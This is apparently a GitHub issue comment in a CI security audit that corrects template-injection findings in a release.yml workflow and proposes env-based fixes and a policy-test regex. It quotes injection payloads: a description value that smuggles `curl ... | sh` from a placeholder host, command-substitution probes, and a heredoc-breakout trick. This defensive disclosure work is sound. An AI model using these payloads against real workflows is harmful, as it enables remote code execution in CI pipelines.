Measured the four `template-injection` sites this issue lists, and **two of them do not execute as described above** — the description in the body ("A `workflow_dispatch` description of `x"; curl -sSf https://example.test/p | sh; echo "` runs as its own command") is right for `release.yml:616` and `:617` and wrong for `:767` and `:770`. Correcting that here rather than leaving it, because the whole point of the audit is that a finding has to mean what it says.

### What the difference is

`:767` and `:770` are inside a **quoted** heredoc:

```yaml
      - name: Create changeset file          # release.yml:758
        run: |
          …
          cat > "$CHANGESET_FILE" << 'EOF'
          ---
          'MyPackage': ${{ github.event.inputs.bump_type }}
          ---

          ${{ github.event.inputs.description || 'Manual release' }}
          EOF
```

With `<< 'EOF'` the shell performs no expansion at all inside the body, so `$( )`, a backtick and `x"; …; echo "` are written to the changeset file as text. The runner's substitution still happens — the value is still in the script — but the shell never evaluates it.

Measured, whole `run:` block substituted and executed exactly as the runner writes it, with stub tools on `PATH` and a payload that proves execution by writing a file:

```
### csharp @ 83efb9e4 -- layer 1, the workflow expansion
  REPRODUCED  csharp release.yml:613 (interpolated at 616,617) (cmdsub)
  inert       csharp release.yml:759 (interpolated at 767,770) (cmdsub)
  REPRODUCED  csharp release.yml:613 (interpolated at 616,617) (heredoc)
  REPRODUCED  csharp release.yml:759 (interpolated at 767,770) (heredoc)
```

`cmdsub` is the payload `$(printf INJECTED >> "$proof")`. `heredoc` is a newline, a line reading `EOF`, then the same `$( )` — which closes the heredoc and puts the rest of the payload back on the shell's command level. So the heredoc site **is** reachable, but only with a value containing a newline, and only because the delimiter is a fixed, guessable `EOF`.

This correction cuts both ways, and neither half is comfortable:

- The claim "quoting inside the script does not help" is too strong for these two sites. It is exactly right for `:616`/`:617`, where the value sits inside double quotes on a command line and `$( )` expands regardless.
- The heredoc is not a mitigation either. It rests on the value being single-line, which nothing enforces: the `inputs` payload limit is [documented in characters, not lines](https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows) ("The maximum payload for `inputs` is 65,535 characters"), the single-line text box is a UI affordance rather than a validation, and the API takes the value as a JSON string. What we did **not** manage to establish is delivery: both probe dispatches were rejected on the `choice` before the API formed any opinion about the description, so "a newline reaches the expansion" is untested and the heredoc half should be read as conditional.
- Even with no newline at all, both heredoc sites are still defects, just different ones: the value lands verbatim in the changeset body, which the release path then prints to the log — and an unbracketed print of `##[error]…` is a live workflow command, because the runner's `ActionCommand.TryParse` accepts `##[` anywhere in a physical line. That is filed separately as the log-injection report.

### What we also measured about `bump_type`

`bump_type` and `release_mode` are `choice` inputs, and GitHub validates a choice server-side:

```console
$ gh api -X POST repos/<owner>/<repo>/actions/workflows/release.yml/dispatches \
    -f ref=<branch> -f 'inputs[release_mode]=definitely-not-an-option' …
{"message":"Provided value 'definitely-not-an-option' for input 'release_mode' not in the list of allowed values","status":"422"}
```

No run is created. So of the four findings, the two that are live through an unvalidated value are `:617` (`description`, on a command line) and `:770` (`description`, in the heredoc, conditional on a newline); `:616` and `:767` take the validated `choice` and are defence in depth. The fix is the same for all four, and worth applying to all four — a later edit that turns a `choice` into a `string` would reintroduce the hole silently.

### The fix, for the heredoc site specifically

`env:` plus an **unquoted** heredoc, so the shell — not the runner — substitutes the value, and a newline in it stays inside the body:

```diff
       - name: Create changeset file
+        env:
+          BUMP_TYPE: ${{ github.event.inputs.bump_type }}
+          DESCRIPTION: ${{ github.event.inputs.description || 'Manual release' }}
         run: |
           …
-          cat > "$CHANGESET_FILE" << 'EOF'
+          cat > "$CHANGESET_FILE" << EOF
           ---
-          'MyPackage': ${{ github.event.inputs.bump_type }}
+          'MyPackage': ${BUMP_TYPE}
           ---
 
-          ${{ github.event.inputs.description || 'Manual release' }}
+          ${DESCRIPTION}
           EOF
```

An unquoted heredoc does expand `$( )` in the *body text of the script* — but the body text is now fixed, and `$DESCRIPTION` is a variable expansion, which is not re-parsed. If keeping `<< 'EOF'` matters, write the two values with `printf '%s\n' "$DESCRIPTION" >> "$CHANGESET_FILE"` instead; either way the value stops being script.

### One more thing, in this repository's own idiom

`scripts/workflow-injection-policy.test.mjs` already walks every `run:` block of every workflow and fails on any expression matching `UNTRUSTED_CONTEXTS`. That list covers `github.head_ref`, PR titles and bodies, commit messages and `workflow_run.head_branch` — and not `inputs`. Two patterns close the gap and turn this issue into a red check:

```diff
 const UNTRUSTED_CONTEXTS = [
   /github\.head_ref/,
+  // A `type: string` workflow_dispatch input is validated by nothing, and a
+  // `choice` is validated by GitHub rather than by this workflow's contract.
+  /github\.event\.inputs\.\w+/,
+  /\binputs\.\w+/,
```

Worth noting what that costs: the test would then also flag the heredoc sites, which — per the measurement above — are content injection rather than execution until a newline arrives. That is the right trade for a policy assertion, as long as the policy is stated as "an untrusted value may not appear in script text" rather than as "this line executes".

Found while auditing every CI/CD false positive and false negative in `link-foundation/box` ([box#123](https://github.com/link-foundation/box/issues/123)), which compares this template's full workflow and script tree against ours. The `go` and `java` templates have the same defect and had no report; they are filed now. The `rust` template fixed it in rust#111 and its `release.yml:1163-1167` is the shape to copy.
